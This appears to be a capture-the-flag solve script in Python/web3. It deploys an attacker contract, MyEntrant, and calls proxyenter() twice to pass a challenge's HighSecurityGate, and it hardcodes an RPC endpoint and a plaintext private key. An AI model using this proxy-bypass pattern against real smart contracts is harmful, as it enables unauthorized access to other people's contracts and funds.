import pprint

from web3 import Web3, AsyncWeb3
from solcx import compile_files

w3 = Web3(Web3.HTTPProvider('http://104.248.169.177:32038'))

def compile_source_files(files):
    return compile_files(files, output_values=["abi", "bin"])

def deploy_contract(w3, contract_interface, address):
    tx_hash = w3.eth.contract(
        abi=contract_interface['abi'],
        bytecode=contract_interface['bin']).constructor(address).transact()

    address = w3.eth.get_transaction_receipt(tx_hash)['contractAddress']
    return address

private_key     =  '0x3f4f895b21c334b2dae05a6ce5eccfb6f730a47c26a8d429698366bc7262e3f5'
address         =  '0xF12E70bD5B79c3B4306A13a6029fb8f5B22Efb5F'
target_contract =  '0x35B3C8E89707DE2dEaB49cf27A70Ab4D4899110C'
setup_contract  =  '0x00e9Cd563757598dbC4EB2081f0276060ddBB497'

contract_source = ['MyEntrant.sol', 'Setup.sol', 'FortifiedPerimeter.sol']
compiled_contracts = compile_source_files(contract_source)

for j in compiled_contracts.keys():
    print(j)

entrant_impl = compiled_contracts.get('MyEntrant.sol:MyEntrant')
entrant_address = deploy_contract(w3, entrant_impl, target_contract)
print(f"Contract: MyEntrant.sol:MyEntrant installed @ {entrant_address}")

high_security_gate_impl = compiled_contracts.get('FortifiedPerimeter.sol:HighSecurityGate')

high_security_gate_contract = w3.eth.contract(address=target_contract, abi=high_security_gate_impl["abi"])
entrant_contact = w3.eth.contract(address=entrant_address, abi=entrant_impl["abi"])

tx_hash = entrant_contact.functions.proxyenter().transact()
#tx_hash = w3.eth.send_transaction({'to': target_contract, 'from': address})
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("Transaction receipt mined:")
pprint.pprint(dict(receipt))
print("\nWas transaction successful?")
pprint.pprint(receipt["status"])
pprint.pprint(w3.eth.get_transaction(tx_hash))

tx_hash = entrant_contact.functions.proxyenter().transact()
#tx_hash = w3.eth.send_transaction({'to': target_contract, 'from': address})
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("Transaction receipt mined:")
pprint.pprint(dict(receipt))
print("\nWas transaction successful?")
pprint.pprint(receipt["status"])
pprint.pprint(w3.eth.get_transaction(tx_hash))


tx_hash = high_security_gate_contract.functions.lastEntrant().transact()
#tx_hash = w3.eth.send_transaction({'to': target_contract, 'from': address})
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("Transaction receipt mined:")
pprint.pprint(dict(receipt))
print("\nWas transaction successful?")
pprint.pprint(receipt["status"])
pprint.pprint(w3.eth.get_transaction(tx_hash))


